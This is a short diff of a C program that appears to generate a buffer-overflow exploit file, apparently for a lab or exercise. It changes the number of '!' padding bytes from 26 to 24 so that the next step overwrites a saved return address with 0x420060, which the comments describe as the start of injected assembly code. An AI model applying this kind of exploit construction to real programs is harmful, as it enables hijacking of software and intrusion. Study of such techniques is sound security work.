@@ -36,7 +36,7 @@ int main(void) {
     }
 
     /* filling the rest of the buffer with exclamation marks */
-    for (i = 0; i < 26; i++) {
+    for (i = 0; i < 24; i++) {
         fputc('!', fp);
     }
 /* overwriting the return address with 0x420060, the start of our assembly code */
